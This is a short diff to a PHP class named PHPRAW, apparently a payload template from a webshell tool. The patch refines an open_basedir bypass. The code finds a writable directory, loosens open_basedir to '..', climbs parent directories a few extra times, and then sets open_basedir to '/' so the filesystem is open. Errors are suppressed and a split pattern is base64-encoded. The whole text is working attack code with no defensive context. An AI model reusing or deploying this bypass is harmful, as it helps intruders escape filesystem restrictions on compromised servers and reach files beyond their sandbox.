@@ -86,7 +86,7 @@ class PHPRAW extends Base {
     $opdir=@ini_get("open_basedir");
     if($opdir) {
         $ocwd=dirname($_SERVER["SCRIPT_FILENAME"]);
-        $oparr=preg_split(base64_decode("/;|:/"),$opdir);
+        $oparr=preg_split(base64_decode("Lzt8Oi8="),$opdir);
         @array_push($oparr,$ocwd,sys_get_temp_dir());
         foreach($oparr as $item) {
             if(!@is_writable($item)){
@@ -97,10 +97,11 @@ class PHPRAW extends Base {
             if(!@file_exists($tmdir)){
                 continue;
             }
+            $tmdir=realpath($tmdir);
             @chdir($tmdir);
             @ini_set("open_basedir", "..");
             $cntarr=@preg_split("/\\\\\\\\|\\//",$tmdir);
-            for($i=0;$i<sizeof($cntarr);$i++){
+            for($i=0;$i<sizeof($cntarr)+5;$i++){
                 @chdir("..");
             };
             @ini_set("open_basedir","/");
